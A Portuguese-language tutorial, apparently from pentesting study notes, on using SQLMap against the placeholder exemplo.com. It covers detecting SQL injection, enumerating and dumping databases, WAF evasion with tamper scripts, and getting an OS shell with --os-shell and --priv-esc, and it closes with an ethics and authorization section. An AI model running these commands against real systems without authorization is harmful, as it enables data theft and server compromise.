# SQLMap — do básico ao avançado

## O que é

SQLMap é uma ferramenta open source de detecção e exploração automatizada de SQL Injection, capaz de identificar o parâmetro vulnerável, confirmar a técnica de injeção aplicável e, a partir daí, enumerar bancos, tabelas e dados — automatizando boa parte do que seria feito manualmente ao explorar uma SQLi (como descrito no `SQLi.md`).

Diferente de ferramentas de força bruta como Hydra e Medusa, o SQLMap não testa credenciais — ele testa se um parâmetro de entrada (URL, POST, cookie, header) é vulnerável a injeção SQL e, uma vez confirmado, oferece um conjunto extenso de recursos para explorar essa vulnerabilidade.

## Instalação

Vem pré-instalado no Kali Linux. Fora dele:

```bash
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python3 sqlmap.py -h
```

## Nível básico

### Sintaxe mínima

```bash
sqlmap -u "http://exemplo.com/pagina.php?id=1"
```

O SQLMap testa automaticamente todos os parâmetros da URL informada (nesse caso, `id`) em busca de SQL Injection, sem necessidade de indicar manualmente qual é o vulnerável.

### Especificando o parâmetro a testar

```bash
sqlmap -u "http://exemplo.com/pagina.php?id=1" -p id
```

`-p` restringe o teste a um parâmetro específico, útil quando a URL tem vários parâmetros e você já suspeita de qual deles é o vulnerável — o que acelera bastante o processo.

### Testando requisições POST

```bash
sqlmap -u "http://exemplo.com/login.php" --data "usuario=admin&senha=teste"
```

`--data` envia os dados via POST, e o SQLMap testa cada campo presente na string em busca de injeção.

### Modo não interativo

```bash
sqlmap -u "http://exemplo.com/pagina.php?id=1" --batch
```

Por padrão, o SQLMap faz perguntas ao longo da execução (confirmar suposições, continuar testes adicionais, etc.). `--batch` aceita automaticamente a resposta padrão de cada pergunta, o que é essencial ao rodar o SQLMap em scripts ou de forma não supervisionada.

## Nível intermediário

### Nível e risco dos testes

```bash
sqlmap -u "http://exemplo.com/pagina.php?id=1" --level=3 --risk=2
```

`--level` (1 a 5) controla quantos testes de injeção diferentes são tentados — níveis mais altos testam mais pontos de injeção (incluindo cookies e headers), mas demoram mais. `--risk` (1 a 3) controla o quão "arriscados" são os payloads testados (níveis mais altos incluem testes que podem, por exemplo, alterar dados). Os valores padrão são os mais conservadores (`--level=1 --risk=1`).

### Técnicas de injeção

```bash
sqlmap -u "http://exemplo.com/pagina.php?id=1" --technique=BEUST
```

Por padrão, o SQLMap tenta todas as técnicas, representadas pelas letras `B` (Boolean-based blind), `E` (Error-based), `U` (Union query-based), `S` (Stacked queries), `T` (Time-based blind) e `Q` (Inline queries). `--technique` permite restringir quais delas usar — útil quando o comportamento da aplicação já indica qual técnica é mais provável de funcionar, ou para evitar técnicas mais lentas (como time-based) quando não são necessárias.

### Identificando informações do banco

```bash
sqlmap -u "http://exemplo.com/pagina.php?id=1" --current-user --current-db --is-dba
```

- `--current-user` retorna o usuário atual do banco de dados
- `--current-db` retorna o banco de dados em uso
- `--is-dba` verifica se o usuário atual tem privilégios administrativos (DBA)
- `-b` / `--banner` retorna o banner de versão do SGBD

### Enumerando bancos, tabelas e colunas

```bash
sqlmap -u "http://exemplo.com/pagina.php?id=1" --dbs
sqlmap -u "http://exemplo.com/pagina.php?id=1" -D nome_do_banco --tables
sqlmap -u "http://exemplo.com/pagina.php?id=1" -D nome_do_banco -T nome_da_tabela --columns
```

Esse é o fluxo natural de enumeração: primeiro listar os bancos disponíveis (`--dbs`), depois as tabelas de um banco específico (`-D` + `--tables`), e por fim as colunas de uma tabela específica (`-D` + `-T` + `--columns`) — cada passo usando a informação do anterior para ir mais a fundo.

### Extraindo dados

```bash
sqlmap -u "http://exemplo.com/pagina.php?id=1" -D nome_do_banco -T usuarios --dump
```

`--dump` extrai o conteúdo de uma tabela específica. `--dump-all` faz o mesmo para todos os bancos e tabelas acessíveis — usar com cautela, já que pode gerar um volume enorme de requisições contra o alvo.

## Nível avançado

### Testando a partir de uma requisição capturada

```bash
sqlmap -r requisicao.txt
```

Em vez de montar manualmente a URL ou os dados do POST, `-r` aceita um arquivo de requisição HTTP crua (como as exportadas do Burp Suite ou de qualquer interceptador de tráfego), preservando headers, cookies e corpo da requisição exatamente como capturados — essencial para testar injeções em fluxos autenticados ou com tokens/CSRF envolvidos.

### Injeção em cookies e headers

```bash
sqlmap -u "http://exemplo.com/pagina.php" --cookie "sessao=1*"
```

O asterisco (`*`) marca manualmente o ponto exato onde o SQLMap deve injetar o payload, útil quando o teste precisa ocorrer em um cookie, header customizado ou qualquer campo fora dos parâmetros padrão de URL/POST detectados automaticamente.

### Contornando proteções básicas

```bash
sqlmap -u "http://exemplo.com/pagina.php?id=1" --random-agent --proxy="http://127.0.0.1:8080" --tamper=space2comment
```

- `--random-agent` varia o User-Agent a cada requisição
- `--proxy` roteia o tráfego por um proxy (útil para observar as requisições no Burp Suite enquanto o SQLMap roda)
- `--tamper` aplica scripts de ofuscação ao payload (como `space2comment`, que substitui espaços por comentários SQL) para tentar evadir filtros simples de WAF — o mesmo tipo de mecanismo de evasão discutido de forma mais geral no `Nmap.md`

### Acesso ao sistema operacional subjacente

```bash
sqlmap -u "http://exemplo.com/pagina.php?id=1" --os-shell
sqlmap -u "http://exemplo.com/pagina.php?id=1" --os-cmd="whoami"
```

Quando o SGBD e a configuração do servidor permitem (por exemplo, MySQL com privilégio `FILE` habilitado, ou MSSQL com `xp_cmdshell` disponível), o SQLMap consegue ir além do banco de dados e obter uma shell no próprio sistema operacional. `--os-shell` abre um prompt interativo, `--os-cmd` executa um único comando, e `--priv-esc` tenta escalar o privilégio do processo do banco de dados no sistema operacional. Esse é o ponto em que a exploração de uma SQLi deixa de ser "apenas" um problema de banco de dados e passa a ser um comprometimento completo do servidor — o motivo pelo qual essa vulnerabilidade é tratada com tanta prioridade.

### Persistência de sessão e retomada

O SQLMap salva o estado da sessão de teste em uma sessão local por padrão, o que permite retomar testes longos sem repetir todo o trabalho de detecção. `--flush-session` descarta essa sessão salva quando se quer forçar uma nova detecção do zero contra o mesmo alvo.

## Fluxo típico de uso

| Ordem | Etapa | Comando de exemplo |
|---|---|---|
| 1 | Confirmar SQLi em um parâmetro | `sqlmap -u alvo -p parametro` |
| 2 | Ajustar nível e risco dos testes | `--level=3 --risk=2` |
| 3 | Identificar informações do banco | `--current-user --current-db --is-dba` |
| 4 | Enumerar bancos, tabelas e colunas | `--dbs` → `-D` `--tables` → `-D -T` `--columns` |
| 5 | Extrair dados | `--dump` |
| 6 | Avaliar acesso ao sistema operacional | `--os-shell` / `--os-cmd` |

## Considerações éticas e legais

O SQLMap não apenas identifica uma vulnerabilidade — ele a explora ativamente, podendo ler, e em alguns casos até modificar, dados reais do banco, além de possivelmente obter acesso ao sistema operacional do servidor. Usar essa ferramenta contra qualquer alvo sem autorização explícita e escopo definido configura acesso indevido a sistema de informação na maioria das legislações. Mesmo em testes autorizados, o uso de `--dump` e `--os-shell` deve ser combinado previamente com o cliente, já que envolve extração real de dados sensíveis e potencial acesso administrativo ao servidor.

## Referências

- Documentação oficial do sqlmap (sqlmap.org)
- Repositório oficial — sqlmapproject/sqlmap (GitHub)
- Manual do sqlmap (`man sqlmap`)